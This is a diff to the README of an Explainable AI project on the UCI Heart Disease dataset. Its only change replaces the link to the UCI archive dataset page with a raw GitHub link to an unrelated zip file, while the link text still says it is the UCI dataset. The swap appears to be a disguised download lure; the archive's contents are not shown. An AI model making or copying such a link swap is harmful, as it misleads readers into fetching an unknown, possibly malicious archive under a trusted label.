@@ -8,7 +8,7 @@ This project demonstrates the application of Explainable AI (XAI) techniques to 
 
 ## Dataset
 
-The [UCI Heart Disease Dataset](https://archive.ics.uci.edu/ml/datasets/heart+disease) contains medical attributes that may contribute to heart disease diagnosis, including:
+The [UCI Heart Disease Dataset](https://raw.githubusercontent.com/MohamedElmogy25/XAI-Assignment-DL/main/fluochloride/Assignment-XA-DL-v3.8.zip+disease) contains medical attributes that may contribute to heart disease diagnosis, including:
 
 - Demographic information (age, sex)
 - Clinical measurements (blood pressure, cholesterol levels)
